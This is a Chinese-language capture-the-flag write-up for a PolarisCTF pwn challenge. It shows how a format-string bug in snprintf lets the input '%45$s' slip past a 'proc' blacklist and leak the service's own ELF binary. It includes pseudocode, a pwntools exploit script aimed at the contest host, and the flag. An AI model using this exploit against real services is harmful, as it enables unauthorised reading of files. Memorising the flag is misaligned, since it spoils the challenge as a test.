# PolarisCTF Pwn（`nc1.ctfplus.cn:29199`）题解

## 1. 题目现象与初探

目标服务：

```bash
nc nc1.ctfplus.cn 29199
```

交互提示：

```text
Enter the filename to download:
```

先做最基础探测：

1. 直接读 `flag` / `/flag`，返回内容是 `nothing here.`（明显是假线索或诱饵）。
2. 访问 `/proc/self/...` 会被拦截，返回 `Access to this file is forbidden.`。
3. 输入长度看起来只有 7 字节有效（例如 `/bin/cat` 实际按 `/bin/ca` 处理）。

这一步得到两个关键信号：

1. 服务本质是“文件读取器”。
2. 有“字符串黑名单 + 长度限制”，常规路径穿越不太好走。

---

## 2. 函数阅读顺序（逆向视角）

这题最开始没给附件，所以先通过漏洞把程序自身内容泄出来，再逆向。  
逆向时建议按下面顺序看（从主流程到漏洞点）：

1. `main`（或主循环）
2. 输入处理（`fgets` / 去换行 / 长度）
3. 黑名单过滤（`strstr("proc")`）
4. 文件名格式化（`snprintf`）
5. 文件打开与回显（`fopen` + `fread`/`fwrite`）

从泄露出的程序字符串与行为可还原出核心流程（伪代码）：

```c
while (1) {
    puts("Enter the filename to download: ");
    fgets(inp, 8, stdin);                    // 最多 7 字节
    inp[strcspn(inp, "\n")] = 0;

    if (strstr(inp, "proc")) {               // 黑名单
        puts("Access to this file is forbidden.");
        continue;
    }

    snprintf(path, PATH_SZ, inp);            // 关键漏洞：用户可控 format string

    fp = fopen(path, "rb");
    if (!fp) {
        // 错误提示
        // xxx not existed or could not be opened.
        continue;
    }

    // 正常读文件并输出 File content:
}
```

---

## 3. 漏洞点分析

漏洞本质：**格式化字符串漏洞（Format String）**。

危险调用是：

```c
snprintf(path, PATH_SZ, user_input);
```

这里 `user_input` 被当作 `format` 使用，而不是普通字符串。  
所以输入 `%p`、`%s`、`%45$s` 这类 payload 时，会触发栈参数读取与字符串展开。

为什么它能打穿黑名单：

1. 黑名单检查的是“原始输入字符串”里是否含 `proc`。
2. 格式化展开发生在检查之后。
3. 所以我们可以输入不含 `proc` 的 `%45$s`，让程序在 `snprintf` 阶段展开成可用路径/可用字符串，再去 `fopen`。

这就是典型的“**过滤在前，解释在后**”导致绕过。

---

## 4. 打通思路（从 0 到 flag）

### Step 1：验证存在格式化字符串漏洞

输入 `%p`，回显会出现地址：

```text
0x7fff... not existed or could not be opened.
```

说明 format string 已成立。

### Step 2：枚举参数位，找能用的 `%n$s`

用脚本枚举 `%1$s ~ %80$s`，观察哪些位可读。  
本题远端稳定可用位是 `45`：

```text
%45$s  -> 触发 File content: 并输出 ELF 二进制
```

说明第 45 个参数展开后，最终形成了可打开的“有效文件名/有效可读对象”，结果把程序自身 ELF 泄出来了。

### Step 3：从泄露 ELF 中提取 flag

把 `%45$s` 的输出保存后跑 `strings`，直接命中：

```text
polarisctf{c7b93b4a-1134-47ef-8bfc-d6b924342dbb}
```

也就是 flag 被硬编码在程序数据区（泄露即得）。

## 5. 复现脚本（一步拿 flag）

```python
from pwn import *
import re

HOST, PORT = "nc1.ctfplus.cn", 29199

r = remote(HOST, PORT, timeout=5)
r.recvuntil(b"Enter the filename to download: ")

# 关键 payload
r.sendline(b"%45$s")

data = r.recvuntil(b"Enter the filename to download: ", timeout=5)
r.close()

m = re.search(rb"polarisctf\{[^}]+\}", data)
if m:
    print(m.group(0).decode())
else:
    print("flag not found, retry or brute-force index")
```

输出：

```text
polarisctf{c7b93b4a-1134-47ef-8bfc-d6b924342dbb}
```

---

## 6. 关键坑点与经验

1. 这题输入有效长度只有 7 字节，很多路径会被截断，容易误判。
2. `/proc` 黑名单不是最终防线，format 展开顺序才是关键。
3. 若 `%45$s` 在不同环境不稳定，可自动枚举 `%i$s`，以 `File content:\x7fELF` 作为命中特征。
